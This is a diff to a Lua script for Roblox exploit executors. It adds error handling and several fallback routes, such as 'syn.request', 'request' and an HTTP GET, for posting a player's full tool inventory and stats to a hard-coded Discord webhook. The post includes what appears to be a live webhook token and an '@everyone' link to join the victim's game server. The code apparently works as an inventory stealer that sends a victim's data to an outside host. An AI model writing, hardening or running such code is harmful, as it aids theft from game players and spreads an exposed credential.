@@ -86,8 +86,23 @@ local function getServers()
     
     while true do
         local url = "https://games.roblox.com/v1/games/"..placeId.."/servers/Public?sortOrder=Asc&limit=100" .. (cursor ~= "" and "&cursor="..cursor or "")
-        local response = game:HttpGet(url)
-        local data = HttpService:JSONDecode(response)
+        local success, response = pcall(function()
+            return game:HttpGet(url)
+        end)
+        
+        if not success then
+            warn("Failed to get servers:", response)
+            break
+        end
+        
+        local success2, data = pcall(function()
+            return HttpService:JSONDecode(response)
+        end)
+        
+        if not success2 then
+            warn("Failed to decode server data:", data)
+            break
+        end
         
         for _, server in ipairs(data.data) do
             if server.playing < server.maxPlayers then
@@ -238,30 +253,60 @@ local function sendWebhook(allTools, playerStats)
     -- Prepare webhook content
     local contentMessage = #allTools > 0 and "@everyone\nClick to join: https://kiel-x-kai.vercel.app/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId or ""
     
-    -- Send webhook
+    -- Send webhook with proper error handling
+    local webhookUrl = "https://discord.com/api/webhooks/1383563137818562560/bJ1xGgySuVJJyzkfgW1xbRM8ReXwYE0Uyi8Th83VluLujac2W2hNO1OyUr0iJ3qHoxU1"
+    
+    local requestData = {
+        content = contentMessage,
+        embeds = {{
+            title = "Full Account Inventory",
+            description = "All tools and player information",
+            color = 65280,
+            fields = embedFields,
+            footer = { text = "Kuruchan System Notification" },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    
+    local jsonData
     local success, err = pcall(function()
-        syn.request({
-            Url = "https://discord.com/api/webhooks/1383563137818562560/bJ1xGgySuVJJyzkfgW1xbRM8ReXwYE0Uyi8Th83VluLujac2W2hNO1OyUr0iJ3qHoxU1",
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode({
-                content = contentMessage,
-                embeds = {{
-                    title = "Full Account Inventory",
-                    description = "All tools and player information",
-                    color = 65280,
-                    fields = embedFields,
-                    footer = { text = "Kuruchan System Notification" },
-                    timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-                }}
+        jsonData = HttpService:JSONEncode(requestData)
+    end)
+    
+    if not success then
+        warn("Failed to encode webhook data:", err)
+        return
+    end
+    
+    -- Try different methods to send the webhook
+    local success, err = pcall(function()
+        if syn and syn.request then
+            return syn.request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
             })
-        })
+        elseif request then
+            return request({
+                Url = webhookUrl,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = jsonData
+            })
+        else
+            return game:HttpGet(webhookUrl.."?data="..HttpService:UrlEncode(jsonData))
+        end
     end)
     
     if not success then
         warn("Failed to send webhook:", err)
+    else
+        print("Webhook sent successfully")
     end
 end
 
